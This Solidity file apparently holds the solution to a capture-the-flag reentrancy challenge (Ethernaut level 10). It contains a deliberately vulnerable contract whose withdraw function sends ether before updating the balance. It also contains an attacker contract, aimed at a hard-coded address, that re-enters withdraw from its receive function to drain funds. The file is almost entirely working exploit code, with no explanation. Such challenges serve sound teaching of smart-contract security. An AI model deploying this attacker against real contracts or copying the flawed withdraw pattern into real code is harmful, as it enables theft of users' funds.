//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract reenteringContract {
    Reentrance level10 =
        Reentrance(payable(0x767cE7899b9d69F0C8d30f6c5b2B8B70112386dc));

    constructor() payable {}

    function sendEther(address _to) public payable {
        level10.donate{value: 0.001 ether}(_to);
    }

    function withdraw() public {
        level10.withdraw(0.001 ether);
    }

    receive() external payable {
        withdraw();
    }
}
